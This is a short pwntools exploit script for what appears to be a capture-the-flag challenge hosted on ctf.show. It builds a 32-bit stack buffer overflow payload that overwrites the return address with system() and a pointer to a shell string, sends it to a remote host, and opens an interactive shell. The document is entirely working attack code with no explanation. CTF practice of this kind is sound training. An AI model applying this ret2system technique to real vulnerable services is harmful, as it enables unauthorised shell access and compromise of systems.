from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28176)
elf = ELF('./pwn')
system = elf.sym['system']
sh = 0x80487BA
payload = 'a'*(0x12+4) + p32(system) + p32(0) + p32(sh)
io.sendline(payload)
io.recv()
io.interactive()
